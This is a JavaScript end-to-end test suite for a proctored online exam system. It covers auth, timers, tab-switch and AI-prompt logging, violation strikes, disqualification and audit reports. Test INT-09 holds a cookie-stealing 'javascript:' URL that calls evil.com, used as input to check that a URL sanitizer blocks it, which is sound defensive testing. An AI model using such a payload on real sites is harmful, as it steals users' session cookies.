/**
 * Tier 3: Cross-Feature Interactions Test Suite (Opaque-Box E2E)
 *
 * Verifies pairwise combinations and cross-subsystem contracts:
 * - Auth + Question access control
 * - Active timer + Tab switching activity
 * - Question answering + AI Search prompt interception
 * - Proctor violation strikes + Auto-disqualification lockdown
 * - Post-disqualification rejection of student answers
 * - Timer timeout sweeper + Late answer lockout
 * - Face absence + On-screen warning banner
 * - Multiple faces + Violation snapshot attachment
 * - Dangerous protocol navigation + Security logging
 * - Rapid Alt+Tab hotkeys + Window focus/blur tracking
 * - Offline answer cache + Online sync
 * - Auditor report retrieval + Scoring and violation correlation
 * - Strike counter synchronization between client and backend
 * - Monotonic timer heartbeat synchronization
 *
 * Total: 14 pairwise interaction tests (minimum target: 12).
 */

const { describe, it, before, after, beforeEach } = require('node:test');
const assert = require('node:assert/strict');
const { E2EHarness } = require('./harness');
const { BrowserMock } = require('./helpers/browserMock');
const { VisionHeuristicsMock } = require('./helpers/visionMock');

describe('Tier 3: Cross-Feature Interactions Suite (14 Tests)', () => {
  let harness;

  before(async () => {
    harness = new E2EHarness({ maxStrikes: 3 });
    await harness.setup();
  });

  after(async () => {
    await harness.teardown();
  });

  beforeEach(() => {
    harness.resetStore();
  });

  it('INT-01: Auth & Question Delivery: Valid token grants question bank while expired token rejects', async () => {
    // 1. Authenticate student
    const otpRes = await harness.requestOtp('STUDENT-INT-01');
    const verifyRes = await harness.verifyOtp('STUDENT-INT-01', otpRes.data.otp);
    const token = verifyRes.data.token;

    // 2. Access with valid token
    const validQuestions = await harness.getQuestions(token);
    assert.strictEqual(validQuestions.status, 200);
    assert.ok(validQuestions.data.length >= 10);

    // 3. Access with revoked / invalid token
    const invalidQuestions = await harness.getQuestions('sess_tok_invalid_random');
    assert.strictEqual(invalidQuestions.status, 401);
  });

  it('INT-02: Active Timer & Tab Switching: Tab switching telemetry logs while countdown timer decreases', async () => {
    const sessionRes = await harness.startSession(15);
    const sessionId = sessionRes.data.sessionId;

    // Initial timer
    const tStart = await harness.getTimer(sessionId);
    assert.strictEqual(tStart.data.status, 'IN_PROGRESS');

    // Simulate student opening external tab to read documentation
    const tabId = harness.browser.createTab('https://developer.mozilla.org');
    await harness.sendTabEvent(sessionId, 'TAB_SWITCH', 'https://developer.mozilla.org', 'MDN Documentation');

    await new Promise(r => setTimeout(r, 60));

    // Return to exam tab
    harness.browser.switchTab(harness.browser.assessmentTabId);
    await harness.sendTabEvent(sessionId, 'TAB_SWITCH', harness.browser.tabs.get(harness.browser.assessmentTabId).url, 'Assessment');

    const tEnd = await harness.getTimer(sessionId);
    assert.strictEqual(tEnd.data.status, 'IN_PROGRESS');
    assert.ok(tEnd.data.serverTime > tStart.data.serverTime);

    // Verify audit log received tab events
    const report = await harness.getAuditReport(sessionId);
    assert.strictEqual(report.data.tabEvents.length, 2);
  });

  it('INT-03: Answering Questions & AI Prompt Interception: Captures prompt while preserving test state', async () => {
    const sessionRes = await harness.startSession(20);
    const sessionId = sessionRes.data.sessionId;

    // Step 1: Answer Question 1
    const ans1 = await harness.submitAnswer(sessionId, 'q1', 'opt_1b');
    assert.strictEqual(ans1.status, 200);

    // Step 2: Student opens ChatGPT tab and types query
    const guestTabId = harness.browser.createTab('https://chatgpt.com');
    const prompt = BrowserMock.interceptAIPrompt('ChatGPT', 'What is the answer for question 2: HTTP status codes', 'https://chatgpt.com');
    assert.ok(prompt);

    // Telemetry logs prompt event
    await harness.sendSearchEvent(sessionId, prompt.service, prompt.query, prompt.url);

    // Step 3: Student returns and answers Question 2
    harness.browser.switchTab(harness.browser.assessmentTabId);
    const ans2 = await harness.submitAnswer(sessionId, 'q2', 'opt_2b');
    assert.strictEqual(ans2.status, 200);

    // Audit verification
    const report = await harness.getAuditReport(sessionId);
    assert.strictEqual(report.data.searchEvents.length, 1);
    assert.strictEqual(report.data.searchEvents[0].query, 'What is the answer for question 2: HTTP status codes');
  });

  it('INT-04: Proctor Strikes & Auto-Disqualification: Accumulating strikes locks active exam workspace', async () => {
    const sessionRes = await harness.startSession(30);
    const sessionId = sessionRes.data.sessionId;

    // Violation 1: Face absent
    const v1 = await harness.sendViolation(sessionId, 'FACE_ABSENT', { durationMs: 3500 });
    assert.strictEqual(v1.data.strikeCount, 1);
    assert.strictEqual(v1.data.action, 'WARN');

    // Violation 2: Gaze diverted
    const v2 = await harness.sendViolation(sessionId, 'EYE_GAZE_DIVERTED', { hgr: 0.20 });
    assert.strictEqual(v2.data.strikeCount, 2);
    assert.strictEqual(v2.data.action, 'WARN');

    // Violation 3: Multiple faces -> Disqualification
    const v3 = await harness.sendViolation(sessionId, 'MULTIPLE_FACES', { faceCount: 2 });
    assert.strictEqual(v3.data.strikeCount, 3);
    assert.strictEqual(v3.data.action, 'DISQUALIFY');

    // Check timer endpoint shows DISQUALIFIED
    const timer = await harness.getTimer(sessionId);
    assert.strictEqual(timer.data.status, 'DISQUALIFIED');
  });

  it('INT-05: Disqualified Session rejects all subsequent question answering with HTTP 403', async () => {
    const sessionRes = await harness.startSession(30);
    const sessionId = sessionRes.data.sessionId;

    // Push 3 violations to trigger disqualification
    await harness.sendViolation(sessionId, 'V1');
    await harness.sendViolation(sessionId, 'V2');
    await harness.sendViolation(sessionId, 'V3');

    // Attempt answering question after disqualification
    const answerRes = await harness.submitAnswer(sessionId, 'q3', 'opt_3b');
    assert.strictEqual(answerRes.status, 403);
    assert.match(answerRes.data.message, /disqualified/i);
  });

  it('INT-06: Timer Expiration Sweeper locks out late answer submissions with HTTP 403', async () => {
    const sessionRes = await harness.startSession(0); // 0 minute duration = immediate expiry
    const sessionId = sessionRes.data.sessionId;

    // Allow clock tick
    await new Promise(r => setTimeout(r, 30));

    // Poll timer to activate sweeper auto-submission
    const timer = await harness.getTimer(sessionId);
    assert.strictEqual(timer.data.status, 'AUTO_SUBMITTED_TIMEOUT');

    // Late answer submission attempt
    const lateAns = await harness.submitAnswer(sessionId, 'q1', 'opt_1b');
    assert.strictEqual(lateAns.status, 403);
    assert.match(lateAns.data.message, /expired and was automatically submitted/i);
  });

  it('INT-07: Face Absence threshold breach fires warning to both backend and client listener', async () => {
    const sessionRes = await harness.startSession(20);
    const sessionId = sessionRes.data.sessionId;

    let receivedClientWarning = null;
    const unsub = harness.browser.proctorAPI.onProctorWarning((w) => {
      receivedClientWarning = w;
    });

    // Vision worker flags absence
    const vision = new VisionHeuristicsMock({ absenceThresholdMs: 3000 });
    const t0 = Date.now();
    vision.evaluateFrame({ faceCount: 0, timestamp: t0 });
    const visionResult = vision.evaluateFrame({ faceCount: 0, timestamp: t0 + 3200 });
    assert.strictEqual(visionResult.hasViolation, true);

    // Ingest violation on backend
    const backendRes = await harness.sendViolation(sessionId, visionResult.violations[0].type, {
      durationMs: visionResult.violations[0].durationMs
    });
    assert.strictEqual(backendRes.status, 200);

    // Dispatch warning to UI
    for (const l of harness.browser.warningListeners) {
      l({ code: 'FACE_ABSENT', strike: backendRes.data.strikeCount });
    }

    assert.ok(receivedClientWarning);
    assert.strictEqual(receivedClientWarning.code, 'FACE_ABSENT');
    assert.strictEqual(receivedClientWarning.strike, 1);
    unsub();
  });

  it('INT-08: Multiple Faces detected attaches snapshot telemetry to violation audit record', async () => {
    const sessionRes = await harness.startSession(30);
    const sessionId = sessionRes.data.sessionId;

    const mockWebpSnapshot = 'data:image/webp;base64,' + Buffer.from('multi_face_snapshot').toString('base64');
    const violRes = await harness.sendViolation(sessionId, 'MULTIPLE_FACES', { count: 3 }, mockWebpSnapshot);
    assert.strictEqual(violRes.status, 200);

    const report = await harness.getAuditReport(sessionId);
    const violRecord = report.data.violations[0];
    assert.strictEqual(violRecord.type, 'MULTIPLE_FACES');
    assert.strictEqual(violRecord.hasSnapshot, true);
    assert.ok(violRecord.snapshot);
  });

  it('INT-09: Omnibox blocks dangerous protocols and logs security activity telemetry', async () => {
    const sessionRes = await harness.startSession(30);
    const sessionId = sessionRes.data.sessionId;

    // Attempt navigation to javascript:
    assert.throws(() => {
      harness.browser.sanitizeAndValidateUrl('javascript:fetch("https://evil.com?c="+document.cookie)');
    }, /Security Exception: Blocked protocol/);

    // Telemetry logs security violation
    await harness.sendInputActivity(sessionId, 'SECURITY_BLOCKED_SCHEME', {
      attemptedUrl: 'javascript:...',
      blockedProtocol: 'javascript:'
    });

    const report = await harness.getAuditReport(sessionId);
    assert.strictEqual(report.data.inputEvents[0].type, 'SECURITY_BLOCKED_SCHEME');
  });

  it('INT-10: Rapid Alt+Tab hotkeys during exam trigger both keystroke and window blur telemetry', async () => {
    const sessionRes = await harness.startSession(30);
    const sessionId = sessionRes.data.sessionId;

    // Keystroke hotkey logged
    await harness.sendInputActivity(sessionId, 'KEYSTROKE', { key: 'Tab', altKey: true });
    // Window blur logged
    await harness.sendInputActivity(sessionId, 'WINDOW_BLUR', { reason: 'Focus lost to another application' });
    // Window focus restored
    await harness.sendInputActivity(sessionId, 'WINDOW_FOCUS', { reason: 'Focus returned' });

    const report = await harness.getAuditReport(sessionId);
    assert.strictEqual(report.data.inputEvents.length, 3);
    assert.strictEqual(report.data.inputEvents[0].type, 'KEYSTROKE');
    assert.strictEqual(report.data.inputEvents[1].type, 'WINDOW_BLUR');
    assert.strictEqual(report.data.inputEvents[2].type, 'WINDOW_FOCUS');
  });

  it('INT-11: Offline Answer Cache saves answers locally and syncs cleanly upon reconnection', async () => {
    const sessionRes = await harness.startSession(30);
    const sessionId = sessionRes.data.sessionId;

    // Online answer
    await harness.submitAnswer(sessionId, 'q1', 'opt_1b');

    // Simulate offline client queue
    const offlineAnswerQueue = [
      { questionId: 'q2', selectedOptionId: 'opt_2b' },
      { questionId: 'q3', selectedOptionId: 'opt_3b' }
    ];

    // Reconnection: batch sync answers
    for (const ans of offlineAnswerQueue) {
      const res = await harness.submitAnswer(sessionId, ans.questionId, ans.selectedOptionId);
      assert.strictEqual(res.status, 200);
      assert.strictEqual(res.data.saved, true);
    }

    // Submit exam and verify all 3 answers evaluated
    const submitRes = await harness.submitExam(sessionId);
    assert.strictEqual(submitRes.data.score, 3);
  });

  it('INT-12: Auditor Review retrieves complete correlated score, questions, and violation timeline', async () => {
    const sessionRes = await harness.startSession(30, 'STUDENT-FULL-CORRELATION');
    const sessionId = sessionRes.data.sessionId;

    // Student answers questions
    await harness.submitAnswer(sessionId, 'q1', 'opt_1b'); // Correct
    await harness.submitAnswer(sessionId, 'q2', 'opt_2a'); // Incorrect

    // Student triggers 1 warning
    await harness.sendViolation(sessionId, 'EYE_GAZE_DIVERTED', { hgr: 0.18 });

    // Student searches AI
    await harness.sendSearchEvent(sessionId, 'ChatGPT', 'what is binary search tree', 'https://chatgpt.com');

    // Final submission
    await harness.submitExam(sessionId);

    // Auditor inspects report
    const auditRes = await harness.getAuditReport(sessionId);
    assert.strictEqual(auditRes.status, 200);
    assert.strictEqual(auditRes.data.session.status, 'SUBMITTED');
    assert.strictEqual(auditRes.data.session.score, 1);
    assert.strictEqual(auditRes.data.violations.length, 1);
    assert.strictEqual(auditRes.data.searchEvents.length, 1);
    assert.strictEqual(auditRes.data.results.length, 10);
  });

  it('INT-13: Strike Counter increments synchronously between client UI state and backend audit store', async () => {
    const sessionRes = await harness.startSession(30);
    const sessionId = sessionRes.data.sessionId;

    let clientStrikeDisplay = 0;
    const unsub = harness.browser.proctorAPI.onProctorWarning((warning) => {
      clientStrikeDisplay = warning.strike;
    });

    // Ingest 2 violations
    const v1 = await harness.sendViolation(sessionId, 'FACE_ABSENT');
    for (const l of harness.browser.warningListeners) {
      l({ strike: v1.data.strikeCount });
    }
    assert.strictEqual(clientStrikeDisplay, 1);

    const v2 = await harness.sendViolation(sessionId, 'HEAD_POSE_DIVERTED');
    for (const l of harness.browser.warningListeners) {
      l({ strike: v2.data.strikeCount });
    }
    assert.strictEqual(clientStrikeDisplay, 2);

    const report = await harness.getAuditReport(sessionId);
    assert.strictEqual(report.data.session.strikeCount, clientStrikeDisplay);
    unsub();
  });

  it('INT-14: Timer Heartbeat query accurately synchronizes client remaining time with server authoritative clock', async () => {
    const sessionRes = await harness.startSession(20);
    const sessionId = sessionRes.data.sessionId;

    const heartbeat1 = await harness.getTimer(sessionId);
    const initialSeconds = heartbeat1.data.remainingSeconds;

    await new Promise(r => setTimeout(r, 100));

    const heartbeat2 = await harness.getTimer(sessionId);
    assert.strictEqual(heartbeat2.status, 200);
    assert.ok(heartbeat2.data.serverTime > heartbeat1.data.serverTime);
    assert.ok(heartbeat2.data.remainingSeconds <= initialSeconds);
  });
});
